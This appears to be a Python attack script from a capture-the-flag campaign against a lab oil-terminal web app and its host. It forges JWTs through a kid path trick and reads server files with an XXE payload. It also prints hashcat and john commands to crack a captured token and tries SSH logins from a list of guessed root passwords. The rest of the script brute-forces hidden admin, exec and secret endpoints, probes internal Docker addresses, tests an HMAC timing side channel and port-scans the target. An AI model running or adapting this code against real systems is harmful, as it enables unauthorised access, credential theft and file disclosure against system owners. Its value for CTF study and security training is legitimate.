#!/usr/bin/env python3
"""round82 — hashcat JWT prep + SSH cred test + new API endpoints + admin portal + orders API"""
import requests, json, time, hashlib, hmac as hm, base64, socket, subprocess, os

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

def xxe_read(path, field="remarks", timeout=10):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=timeout)
        if r.status_code == 200:
            data = json.loads(r.text)
            return 200, data.get("summary", data.get("ticket", {})).get(field, "")
        return r.status_code, r.text
    except requests.exceptions.Timeout:
        return -1, "TIMEOUT"
    except Exception as e:
        return -2, str(e)

# ============================================================
print("="*70)
print("PHASE 0: HEALTH CHECK")
print("="*70)
try:
    r = requests.get(f"{CASPI}/api/auth/me", headers=AUTH_OP, timeout=8)
    print(f"  Server: [{r.status_code}] {r.text[:100]}")
except Exception as e:
    print(f"  FAILED: {e}")
    exit(1)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 1: HASHCAT JWT PREPARATION")
print("="*70)
print("  Write JWT to file for hashcat cracking")
print("  Mode: 16500 (JWT HS256)")

jwt_for_crack = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImNhcnJpZXIifQ.eyJzdWIiOjYwNzcsImNvbXBhbnkiOiJDVEZfVGVhbV9mdWJ6bnoiLCJyb2xlIjoiY2FycmllciIsImlhdCI6MTc5MDc2MDAxMywiZXhwIjoxNzkwODQ2NDEzfQ.8nBoF23TaW2jXaeo22fJ6ODwO3yXSSUE7LFbzdHEHJk"

# Save JWT to file
with open("/tmp/jwt_crack.txt", "w") as f:
    f.write(jwt_for_crack)
print(f"  JWT saved to /tmp/jwt_crack.txt")
print(f"\n  === HASHCAT COMMANDS ===")
print(f"  # Wordlist attack (rockyou):")
print(f"  hashcat -m 16500 /tmp/jwt_crack.txt /usr/share/wordlists/rockyou.txt")
print(f"  # Wordlist + rules:")
print(f"  hashcat -m 16500 /tmp/jwt_crack.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule")
print(f"  # Brute-force short keys (1-8 chars):")
print(f"  hashcat -m 16500 /tmp/jwt_crack.txt -a 3 '?a?a?a?a?a?a?a?a' --increment")
print(f"  # Hex brute-force (1-8 hex chars):")
print(f"  hashcat -m 16500 /tmp/jwt_crack.txt -a 3 -1 '0123456789abcdef' '?1?1?1?1?1?1?1?1' --increment")
print(f"\n  === JOHN COMMANDS ===")
print(f"  john /tmp/jwt_crack.txt --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt")
print(f"\n  === PYTHON JWT TOOL ===")
print(f"  pip install PyJWT")
print(f"  # Then try common keys programmatically")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: SSH CREDENTIAL TEST")
print("="*70)
print("  Port 22 open (OpenSSH 10.2p1). Test known credentials.")

# Simple SSH banner check
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((HOST, 22))
    banner = s.recv(1024).decode(errors='replace').strip()
    print(f"  Banner: {banner}")
    s.close()
except Exception as e:
    print(f"  SSH: {e}")

# Try SSH with known credentials using sshpass (if available)
ssh_creds = [
    ("root", "terminal_web_pw"),
    ("root", "Ctffubznz2026!"),
    ("root", "CaspiTerminal"),
    ("root", "admin"),
    ("root", "password"),
    ("root", "toor"),
    ("root", "root"),
    ("terminal_web", "terminal_web_pw"),
    ("admin", "admin"),
    ("admin", "password"),
    ("ctf", "ctf"),
]

sshpass_available = os.system("which sshpass > /dev/null 2>&1") == 0

if sshpass_available:
    print("  sshpass found — testing credentials:")
    for user, passwd in ssh_creds:
        try:
            result = subprocess.run(
                ["sshpass", "-p", passwd, "ssh", "-o", "StrictHostKeyChecking=no",
                 "-o", "ConnectTimeout=5", "-o", "BatchMode=no",
                 f"{user}@{HOST}", "id; hostname; cat /etc/hostname"],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                print(f"  *** SSH SUCCESS: {user}:{passwd} ***")
                print(f"  Output: {result.stdout[:500]}")
                break
            elif "Permission denied" in result.stderr:
                pass  # Wrong password, expected
            elif "Connection refused" in result.stderr:
                print(f"  SSH connection refused!")
                break
            else:
                print(f"  {user}:{passwd}: {result.stderr[:100]}")
        except subprocess.TimeoutExpired:
            print(f"  {user}:{passwd}: timeout")
        except Exception as e:
            print(f"  {user}:{passwd}: {e}")
        time.sleep(0.5)
else:
    print("  sshpass NOT available — manual SSH commands:")
    for user, passwd in ssh_creds[:5]:
        print(f"  ssh {user}@{HOST}  # password: {passwd}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: PORTAL WITH DIFFERENT ROLES + sub=1")
print("="*70)
print("  Does role=admin show more data in the portal?")

for role in ["carrier", "operator", "admin", "root", "superadmin", "probe",
             "dispatch", "manager", "terminal"]:
    token = jwt_forged(role=role, sub=1, company="CTF_Team_fubznz")
    try:
        r = requests.get(f"{CASPI}/portal",
                        headers={"Cookie": f"session={token}"}, timeout=8)
        if r.status_code == 200:
            html = r.text
            has_orders = "LO-2026" in html
            # Count table rows
            import re
            rows = len(re.findall(r'<tr>', html)) - 1  # minus header row
            # Look for extra content not in carrier portal
            has_admin = "admin" in html.lower() and "admin" not in html.lower().split("nav")[0]
            extra_content = len(html)

            if has_orders:
                # Check if there's MORE data than carrier (2 orders, ~4344 chars)
                if extra_content > 4500 or rows > 3:
                    print(f"  *** role={role}: EXTRA CONTENT! len={extra_content} rows={rows} ***")
                    # Print the differences
                    if "config" in html.lower() or "secret" in html.lower() or "probe" in html.lower():
                        idx = html.lower().find("config") or html.lower().find("secret") or html.lower().find("probe")
                        if idx and idx > 0:
                            print(f"    Found keyword: ...{html[max(0,idx-50):idx+100]}...")
                else:
                    print(f"  role={role}: standard orders (len={extra_content})")
            else:
                print(f"  role={role}: [{r.status_code}] no orders")
        else:
            print(f"  role={role}: [{r.status_code}]")
    except Exception as e:
        print(f"  role={role}: {e}")
    time.sleep(0.2)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: UNDISCOVERED API ENDPOINTS")
print("="*70)
print("  Testing endpoints we might have missed")

# New endpoints to try
new_endpoints = [
    # GraphQL
    ("GET", "/graphql", None),
    ("POST", "/graphql", {"query": "{ __schema { types { name } } }"}),
    ("GET", "/graphiql", None),
    ("GET", "/api/graphql", None),
    ("POST", "/api/graphql", {"query": "{ __schema { types { name } } }"}),
    # Orders API
    ("GET", "/api/ops/orders", None),
    ("POST", "/api/ops/orders", {"tank": "T-01", "product": "Diesel", "volume": 10}),
    ("GET", "/api/ops/orders/LO-2026-0412", None),
    ("POST", "/api/ops/orders/LO-2026-0412/confirm", {}),
    ("PUT", "/api/ops/orders/LO-2026-0412", {"status": "confirmed"}),
    ("DELETE", "/api/ops/orders/LO-2026-0412", None),
    # Loading windows
    ("GET", "/api/ops/loading", None),
    ("GET", "/api/ops/loading/windows", None),
    ("POST", "/api/ops/loading/book", {"tank": "T-01"}),
    # Tank management
    ("GET", "/api/ops/tanks", None),
    ("GET", "/api/ops/tanks/1", None),
    ("POST", "/api/ops/tanks/1/drain", {}),
    ("POST", "/api/ops/tanks/1/transfer", {"to": 2}),
    ("POST", "/api/ops/tanks/1/steal", {}),
    # Admin endpoints
    ("GET", "/api/admin", None),
    ("GET", "/api/admin/config", None),
    ("GET", "/api/admin/secrets", None),
    ("GET", "/api/admin/users", None),
    ("GET", "/api/admin/probe", None),
    ("POST", "/api/admin/probe/key", {}),
    ("GET", "/api/config", None),
    ("GET", "/api/secrets", None),
    # Debug/info
    ("GET", "/api/info", None),
    ("GET", "/api/version", None),
    ("GET", "/api/status", None),
    ("GET", "/api/debug", None),
    ("GET", "/debug", None),
    ("GET", "/info", None),
    ("GET", "/status", None),
    ("GET", "/version", None),
    ("GET", "/config", None),
    ("GET", "/.well-known/openapi.json", None),
    ("GET", "/openapi.json", None),
    ("GET", "/swagger.json", None),
    ("GET", "/api-docs", None),
    ("GET", "/docs", None),
    ("GET", "/redoc", None),
    # Websocket
    ("GET", "/ws", None),
    ("GET", "/websocket", None),
    ("GET", "/api/ws", None),
    ("GET", "/socket.io/", None),
    # Probe related
    ("GET", "/api/ops/probe/key", None),
    ("GET", "/api/ops/probe/secret", None),
    ("GET", "/api/ops/probe/config", None),
    ("POST", "/api/ops/probe/register", {"device": "tk-99", "url": "http://test"}),
    ("GET", "/api/ops/probe/devices", None),
    ("GET", "/api/ops/probe/list", None),
    # Custody
    ("GET", "/api/ops/custody", None),
    ("GET", "/api/ops/custody/list", None),
    ("GET", "/api/ops/custody/tickets", None),
    # Users
    ("GET", "/api/auth/users", None),
    ("GET", "/api/auth/user/1", None),
    ("GET", "/api/users", None),
    # Shell/exec
    ("POST", "/api/exec", {"cmd": "id"}),
    ("POST", "/api/shell", {"cmd": "id"}),
    ("POST", "/api/run", {"cmd": "id"}),
    ("POST", "/api/ops/exec", {"cmd": "id"}),
    # Flag
    ("GET", "/flag", None),
    ("GET", "/api/flag", None),
    ("GET", "/api/ops/flag", None),
]

for method, path, body in new_endpoints:
    try:
        if method == "GET":
            r = requests.get(f"{CASPI}{path}", headers=AUTH_OP, timeout=5)
        elif method == "POST":
            r = requests.post(f"{CASPI}{path}", json=body, headers=AUTH_OP, timeout=5)
        elif method == "PUT":
            r = requests.put(f"{CASPI}{path}", json=body, headers=AUTH_OP, timeout=5)
        elif method == "DELETE":
            r = requests.delete(f"{CASPI}{path}", headers=AUTH_OP, timeout=5)

        if r.status_code not in [404, 405]:
            print(f"  *** [{r.status_code}] {method} {path}: {r.text[:200]} ***")
    except:
        pass
    time.sleep(0.04)

print("  Endpoint scan complete")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: PROBE_SECRET EXTRACTION — CREATIVE METHODS")
print("="*70)

# Idea 1: Can we use kid=/proc/self/environ and RECONSTRUCT the env?
# The env file has null bytes as separators
# We know some variables: HOSTNAME, PATH, DATABASE_URL
# If we can guess ALL variables and their ORDER, we can verify

# Standard Docker Python image environment:
# PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# Actually: PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin (from Dockerfile)
# Or: PATH=/usr/local/bin:/usr/local/sbin:/usr/sbin:/usr/bin:/sbin:/bin

# Python Docker images add:
# LANG=C.UTF-8
# GPG_KEY=...
# PYTHON_VERSION=3.11.x
# PYTHON_PIP_VERSION=...
# PYTHON_SETUPTOOLS_VERSION=...

# Let's try some common Docker Python env patterns
# and see if any match with a simple PROBE_SECRET

print("  Testing /proc/self/environ reconstruction:")
print("  (This is a long shot — need to guess ALL env vars in order)")

# First, let's check what the Python Docker image typically has
# by reading /usr/local/lib/python3.11/EXTERNALLY-MANAGED or similar markers
for path in [
    "/usr/local/lib/python3.11/EXTERNALLY-MANAGED",
    "/usr/local/lib/python3.11/pyvenv.cfg",
    "/root/.local/lib/python3.11/site-packages/pip/_vendor/__init__.py",
]:
    code, val = xxe_read(path, timeout=3)
    if code == 200 and val:
        print(f"  {path}: {val[:200]}")
    time.sleep(0.05)

# Idea 2: Try reading app.py through /proc/PID/root symlink
# /proc/self/root/app/app.py → same as /app/app.py → still 400
# But what about /proc/self/exe?
for path in [
    "/proc/self/exe",  # symlink to python binary
    "/proc/self/fd/0",  # stdin
    "/proc/self/fd/1",  # stdout
    "/proc/self/fd/3",  # might be the app.py file descriptor
    "/proc/self/fd/4",
    "/proc/self/fd/5",
    "/proc/self/fd/6",
    "/proc/self/fd/7",
    "/proc/self/fd/8",
    "/proc/self/fd/9",
    "/proc/self/fd/10",
    "/proc/self/fd/11",  # might be keys/carrier
    "/proc/self/fd/12",
]:
    code, val = xxe_read(path, timeout=3)
    if code == 200 and val:
        # Check if this contains PROBE_SECRET hints
        print(f"  *** /proc/self/fd/{path.split('/')[-1]}: ({len(val)} bytes) {val[:200]} ***")
    elif code == 400:
        print(f"  {path}: EXISTS(400) — binary/special chars")
    time.sleep(0.05)

# Idea 3: Can we read the Python bytecode more cleverly?
# .pyc files have a header (magic, timestamp, size) then marshalled code
# The magic for Python 3.11 is specific bytes
# What if we use kid oracle to verify parts of the .pyc?
# No, the oracle needs the FULL file content, not parts.

# Idea 4: What if we can abuse the probe endpoint to hit INTERNAL endpoints?
# We have 5 signed URLs, all to gauge-gw.internal:9100
# What if gauge-gw responds differently to URLs with auth headers?
# The probe sends a plain GET without auth headers

# Idea 5: Check if there's a REDIRECT from gauge-gw that leaks info
# Our probe responses are: {"body": "<json>", "status": 200}
# What if a different gauge-gw endpoint returns a redirect?
# The probe might follow the redirect and we'd see the final response

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: GAUGE-GW DIRECT ACCESS TEST")
print("="*70)
print("  Test if we can reach gauge-gw directly (not through probe)")
print("  Try DNS resolution of gauge-gw.internal")

# Test DNS resolution
try:
    ip = socket.gethostbyname("gauge-gw.internal")
    print(f"  gauge-gw.internal resolves to: {ip}")
except:
    print(f"  gauge-gw.internal: DNS resolution failed (expected from Kali)")

# Can we reach 172.18.0.4 directly from Kali?
for port in [80, 8080, 9100, 3000, 5000]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        result = s.connect_ex(("172.18.0.4", port))
        if result == 0:
            print(f"  *** 172.18.0.4:{port} REACHABLE from Kali! ***")
        s.close()
    except:
        pass

# Try Docker host IPs
for ip in ["172.18.0.2", "172.18.0.4", "172.18.0.6", "172.18.0.7"]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((ip, 80))
        if result == 0:
            print(f"  *** {ip}:80 REACHABLE! ***")
            try:
                r = requests.get(f"http://{ip}/", timeout=3)
                print(f"    HTTP: [{r.status_code}] {r.text[:100]}")
            except:
                pass
        s.close()
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: LAST RESORT — EXTRACT PROBE_SECRET VIA TIMING")
print("="*70)
print("  Check if HMAC verification has any timing differences")
print("  compare_digest should prevent this, but let's verify")

url_test = "http://gauge-gw.internal:9100/v1/tanks/1/level"
real_sig = "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"

# Measure response time for correct vs incorrect sigs
timings_correct = []
timings_wrong = []

for i in range(10):
    # Correct sig
    start = time.time()
    try:
        r = requests.post(f"{CASPI}/api/ops/probe",
                         json={"url": url_test, "sig": real_sig},
                         headers=AUTH_OP, timeout=10)
        elapsed = time.time() - start
        timings_correct.append(elapsed)
    except:
        pass
    time.sleep(0.1)

    # Wrong sig (first char different)
    wrong_sig = "0" + real_sig[1:]
    start = time.time()
    try:
        r = requests.post(f"{CASPI}/api/ops/probe",
                         json={"url": url_test, "sig": wrong_sig},
                         headers=AUTH_OP, timeout=10)
        elapsed = time.time() - start
        timings_wrong.append(elapsed)
    except:
        pass
    time.sleep(0.1)

if timings_correct and timings_wrong:
    avg_correct = sum(timings_correct) / len(timings_correct)
    avg_wrong = sum(timings_wrong) / len(timings_wrong)
    print(f"  Correct sig avg: {avg_correct*1000:.1f}ms (10 samples)")
    print(f"  Wrong sig avg:   {avg_wrong*1000:.1f}ms (10 samples)")
    print(f"  Difference:      {(avg_correct-avg_wrong)*1000:.1f}ms")
    if abs(avg_correct - avg_wrong) > 0.01:  # 10ms difference
        print(f"  *** SIGNIFICANT TIMING DIFFERENCE — timing attack possible! ***")
    else:
        print(f"  No significant timing difference (compare_digest confirmed)")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: ADDITIONAL PORT SCAN — HIGH PORTS")
print("="*70)
print("  Maybe Nomad Stronghold is on a high port")

high_ports = list(range(8000, 8100)) + list(range(9000, 9010)) + \
             [3389, 4443, 5555, 7777, 8443, 8888, 9090, 9443, 9500,
              10000, 10080, 20000, 30000, 40000, 50000]

for port in high_ports:
    if port in [8007, 9000, 9001, 9002, 9003]:
        continue  # Already known
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        result = s.connect_ex((HOST, port))
        if result == 0:
            print(f"  *** OPEN: {port} ***")
            try:
                r = requests.get(f"http://{HOST}:{port}/", timeout=3)
                print(f"    HTTP: [{r.status_code}] {r.text[:150]}")
            except:
                pass
        s.close()
    except:
        pass

print("  High port scan complete")

print("\n"+"="*70)
print("DONE — round82")
print("="*70)
